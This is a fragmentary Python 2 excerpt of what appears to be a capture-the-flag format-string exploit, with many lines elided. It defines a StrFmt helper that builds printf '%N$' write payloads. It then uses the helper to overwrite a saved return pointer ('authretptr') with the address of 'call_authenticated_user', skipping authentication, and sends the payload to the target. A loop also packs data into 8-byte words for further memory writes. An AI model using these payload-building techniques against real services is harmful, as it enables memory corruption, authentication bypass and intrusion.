    ...
    def write(self, addr, value, granularity=None, nbytes=None, pad_char=None):
        ...
        for i in range(nbytes/granularity):
          ...
          while expected_max_len < current_len:
            ...
            writefmt  = "%{}${}".format(self.strfmt_position+(expected_max_len+len(adjustfmt))/self.arch, len_modifier)
...
strfmt=StrFmt(6)
repeatfmt=strfmt.write(addr=authretptr, value=call_authenticated_user, granularity=2, nbytes=2)[0]
p.send_raw(repeatfmt)
...
for i in range(0, len(write_str), 8):
  write_dict[buf+i] = int(write_str[i:i+8][::-1].encode("hex"), 16)
